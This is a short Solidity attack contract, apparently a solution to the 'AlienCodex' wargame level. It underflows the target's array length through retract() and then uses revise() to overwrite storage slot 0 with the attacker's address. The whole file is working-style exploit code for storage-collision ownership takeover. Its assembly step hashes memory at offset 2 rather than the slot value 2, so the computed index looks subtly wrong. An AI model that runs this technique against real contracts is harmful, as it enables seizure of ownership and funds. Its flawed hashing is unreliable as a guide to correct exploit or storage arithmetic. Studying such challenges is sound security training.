pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienAttack {
    IAlienCodex public alienCodex;

    constructor(address _instance) {
        alienCodex = IAlienCodex(_instance);
    }

    function attack() external {
        alienCodex.makeContact();
        alienCodex.retract(); // codex.length = 0 => sets to 2^256 -1

        uint256 codexBaseSlot = 2;
        uint256 i;
        assembly {
            let hashedSlot := keccak256(codexBaseSlot, 0x20)
            i := sub(0, hashedSlot) // i = -keccak256(2)
        }

        bytes32 content = bytes32(uint160(address(this)));
        alienCodex.revise(i, content);
    }

    receive() external payable {}
}
